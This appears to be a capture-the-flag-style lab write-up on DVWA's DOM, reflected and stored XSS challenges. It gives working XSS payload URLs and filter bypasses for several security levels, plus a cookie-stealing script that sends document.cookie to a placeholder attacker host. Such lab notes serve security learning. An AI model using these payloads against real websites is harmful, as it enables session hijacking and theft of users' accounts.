# XSS DOM/Reflected/Stored - Low/Medium/High/Impossible

## Low/Medium/High

XSS can be executed from the URL `http://192.168.1.23/DVWA/vulnerabilities/xss_d/?default=English<script>alert("test");</script>`. In this case, viewing the page source will not see the script as it is happening in the DOM.  More interestingly, in medium we need to first break out of the select block then add our attack, e.g. `http://localhost/DVWA/vulnerabilities/xss_d/?default=English>/option></select><img src='x' onerror='alert(1)'>`. For high, we can http://localhost/DVWA/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>. to bypass as they whitelisted languages.


The idea would be then to implement something like `<script>img=new Image();img.src="http://ATTACKER_IP/cookiestealer.php?cookie="+document.cookie;</script>` where the attacker is hosting cookiestealer.php included in this folder.

Note that these attacks can be applied to all three categories: DOM, reflected and stored.
